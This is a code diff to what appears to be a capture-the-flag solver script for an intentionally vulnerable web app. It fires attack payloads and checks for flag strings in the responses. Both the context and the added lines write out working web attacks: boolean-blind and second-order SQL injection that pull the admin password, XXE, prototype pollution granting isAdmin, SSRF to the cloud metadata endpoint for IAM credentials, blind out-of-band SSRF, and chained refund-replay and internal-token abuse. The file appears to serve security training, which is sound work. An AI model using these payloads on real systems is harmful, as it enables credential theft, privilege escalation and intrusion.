@@ -198,6 +198,29 @@ ok(57, 'composer_xxe', (await txt('/api/import/xml', J({ xml: '<?xml version="1.
 ok(58, 'composer_prototype_pollution', (await txt('/api/prefs', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"prefs":{"__proto__":{"isAdmin":true}}}' })).body.includes('lj_prototype_pollution'));
 ok(59, 'composer_ssrf_cloud', (await txt('/api/import-avatar', J({ url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/role' }))).body.includes('lj_ssrf_cloud_metadata_creds'));
 
+// ─────────────────────── v8 MULTI-ACTOR + BLIND / SECOND-ORDER ───────────────────────
+// boolean-blind SQLi: confirm first char of admin password is 'J' (true), 'A' would be false
+{ const t = encodeURIComponent(`x' OR (SELECT substr(password,1,1) FROM users WHERE id=1)='J' -- `);
+  const f = encodeURIComponent(`x' OR (SELECT substr(password,1,1) FROM users WHERE id=1)='A' -- `);
+  const tv = JSON.parse((await txt('/api/coupon/check?code=' + t)).body);
+  const fv = JSON.parse((await txt('/api/coupon/check?code=' + f)).body);
+  ok(60, 'blind_sqli', tv.valid === true && fv.valid === false && (await txt('/api/coupon/check?code=' + t)).body.includes('lj_boolean_blind_sqli')); }
+// second-order SQLi: register a payload name, then trigger the admin report
+{ await txt('/api/signup', J({ email: 'so' + Date.now() + '@x.com', password: 'x', name: "z' UNION SELECT email,password FROM users -- " }));
+  ok(61, 'second_order_sqli', (await txt('/api/admin/report')).body.includes('lj_second_order_sqli')); }
+// blind SSRF confirmed out-of-band via a collaborator beacon
+const oobTok = 'tok' + Date.now();
+{ await txt('/api/ping', J({ url: B + '/oob/' + oobTok }));
+  ok(62, 'blind_ssrf_oob', (await txt('/oob/' + oobTok + '/check')).body.includes('lj_blind_ssrf_oob')); }
+// Chain E — persistent payout (webhook + replayed refund already present from v5/v4 runs; ensure both)
+{ await txt('/api/webhooks', J({ url: B + '/internal/metadata', event: 'x' }));
+  await txt('/api/orders/40903/refund', J({})); await txt('/api/orders/40903/refund', J({}));
+  ok('E', 'chain_persistent_payout', (await txt('/api/black/persistent-payout', J({}))).body.includes('lj_chain_persistent_payout')); }
+// Chain F — OOB-confirmed internal breach (reuse the confirmed oob token + leaked internal token)
+{ const cfg = JSON.parse((await txt('/api/import-avatar', J({ url: B + '/internal/metadata' }))).body);
+  const internal = JSON.parse(cfg.body).internal_token;
+  ok('F', 'chain_oob_confirmed', (await txt('/api/black/oob-breach', J({ token: oobTok, internal_token: internal }))).body.includes('lj_chain_oob_internal_breach')); }
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
